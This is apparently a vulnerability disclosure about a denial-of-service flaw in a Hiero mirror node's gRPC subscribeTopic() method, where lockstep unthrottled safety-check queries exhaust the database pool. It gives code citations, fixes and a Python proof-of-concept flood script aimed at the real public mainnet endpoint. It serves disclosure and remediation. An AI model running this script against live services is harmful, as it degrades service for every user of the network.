### Title
Unauthenticated Synchronized Database Query Storm via Safety Check Timer in `subscribeTopic()`

### Summary
The `subscribeTopic()` method in `TopicMessageServiceImpl.java` schedules a `Mono.delay(Duration.ofSeconds(1L))` safety-check database query for every subscription, with no global subscription cap and no authentication requirement on the gRPC endpoint. An unprivileged attacker can open a large number of simultaneous TCP connections (each carrying up to 5 concurrent calls per the only enforced limit), causing all safety-check timers to fire at the same instant, producing a synchronized burst of unthrottled database queries that exhausts the connection pool and degrades service for all users.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, `subscribeTopic()`, lines 67–70:

```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
```

When `current == null` (the safety-check path), `missingMessages()` at lines 142–149 calls:

```java
return topicMessageRetriever.retrieve(gapFilter, false);  // throttled=false
```

`PollingTopicMessageRetriever.retrieve()` with `throttled=false` uses `UnthrottledProperties`:
- `maxPageSize = 5000` rows per poll
- `maxPolls = 12` polls
- `pollingFrequency = 20ms`

This means each safety-check can issue up to **12 sequential DB queries fetching up to 5,000 rows each** within ~240ms.

**Root cause and failed assumption:**

The design assumes the safety check is a rare, isolated event. The failed assumption is that subscriptions will be spread out over time. In reality:
1. There is no global limit on total concurrent subscriptions — `subscriberCount` at line 48 is a **metric gauge only**, never enforced as a cap.
2. The only enforced limit is `maxConcurrentCallsPerConnection = 5` (lines 33–34 of `GrpcConfiguration.java`), which is **per TCP connection**, not global.
3. No authentication or rate limiting exists on the gRPC `subscribeTopic` endpoint.
4. `isComplete()` (lines 203–215) returns `false` whenever `filter.getEndTime() == null`, so omitting `endTime` guarantees the safety check always fires.
5. `Mono.delay(Duration.ofSeconds(1L))` uses Reactor's default timer scheduler with no jitter, so all subscriptions opened within the same second fire their safety checks at the same wall-clock instant.

### Impact Explanation

An attacker opens `C` TCP connections, each carrying 5 concurrent `subscribeTopic` calls (the per-connection maximum), yielding `5C` simultaneous subscriptions. After exactly 1 second, all `5C` safety-check timers fire simultaneously. Each dispatches up to 12 unthrottled DB queries on `Schedulers.boundedElastic()`. With a modest `C = 200` connections, this produces **1,000 simultaneous DB query bursts**, each capable of fetching 5,000 rows. The HikariCP connection pool (bounded by the database's `max_connections`) is exhausted, causing all legitimate queries — including those from other subscribers and the importer — to queue or time out. The gRPC service becomes unresponsive for all users. The `GrpcHighDBConnections` Prometheus alert threshold (75% utilization) would trigger, but only after the damage is done.

### Likelihood Explanation

The attack requires no credentials, no special protocol knowledge beyond standard gRPC, and no on-chain resources. Any client capable of opening TCP connections to port 5600 can execute it. The gRPC `ConsensusService/subscribeTopic` endpoint is publicly exposed via the Ingress/Gateway configuration. The attack is trivially repeatable: after connections are dropped, the attacker can immediately reconnect and repeat. The 1-second synchronization window is deterministic and requires no timing precision from the attacker — simply opening all connections in a short burst is sufficient.

### Recommendation

1. **Add a global subscription cap**: Enforce a configurable maximum on `subscriberCount` in `subscribeTopic()` and reject new subscriptions with `RESOURCE_EXHAUSTED` when the cap is reached.
2. **Add jitter to the safety-check delay**: Replace `Mono.delay(Duration.ofSeconds(1L))` with a randomized delay (e.g., `Duration.ofMillis(500 + ThreadLocalRandom.current().nextLong(1000))`) to desynchronize concurrent safety checks.
3. **Rate-limit per-IP connections**: Configure Netty's `maxConnectionsPerIp` or add an infrastructure-level (Traefik/GCP Gateway) per-IP connection rate limit on port 5600.
4. **Throttle the safety-check retrieval**: Pass `throttled=true` to `topicMessageRetriever.retrieve()` in the safety-check path (line 149) to cap page size at 1,000 rows instead of 5,000.
5. **Require authentication for gRPC subscriptions**: Add a gRPC interceptor that validates a token or API key before allowing `subscribeTopic` to proceed.

### Proof of Concept

```python
import grpc
import threading
import time
# Assumes generated stubs for com.hedera.mirror.api.proto.ConsensusService

TARGET = "grpc.mainnet.mirrornode.hedera.com:443"
NUM_CONNECTIONS = 200  # 200 connections × 5 calls = 1000 subscriptions

def open_subscriptions(conn_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = ConsensusServiceStub(channel)
    # Open 5 concurrent subscriptions per connection, no endTime set
    streams = []
    for _ in range(5):
        req = ConsensusTopicQuery(
            topic_id=ConsensusTopicID(topic_num=1),  # any valid topic
            # endTime intentionally omitted so isComplete() always returns false
        )
        streams.append(stub.subscribeTopic(req))
    # Hold connections open for >1 second to ensure safety check fires
    time.sleep(3)
    channel.close()

# Launch all connections simultaneously
threads = [threading.Thread(target=open_subscriptions, args=(i,))
           for i in range(NUM_CONNECTIONS)]
start = time.time()
for t in threads:
    t.start()
# All 1000 safety-check timers fire at start+1s simultaneously
for t in threads:
    t.join()
# Observe: DB connection pool exhausted, legitimate queries time out
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-48)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L67-70)
```java
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L142-149)
```java
        if (current == null) {
            long startTime = last != null
                    ? last.getConsensusTimestamp() + 1
                    : topicContext.getFilter().getStartTime();
            var gapFilter =
                    topicContext.getFilter().toBuilder().startTime(startTime).build();
            log.info("Safety check triggering gap recovery query with filter {}", gapFilter);
            return topicMessageRetriever.retrieve(gapFilter, false);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-214)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
            }

            if (filter.getEndTime() < startTime) {
                return true;
            }

            return Instant.ofEpochSecond(0, filter.getEndTime())
                    .plus(grpcProperties.getEndTimeInterval())
                    .isBefore(Instant.now());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L32-34)
```java
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/RetrieverProperties.java (L36-46)
```java
    public static class UnthrottledProperties {

        @Min(1000)
        private int maxPageSize = 5000;

        @Min(4)
        private long maxPolls = 12;

        @DurationMin(millis = 10)
        @NotNull
        private Duration pollingFrequency = Duration.ofMillis(20);
```
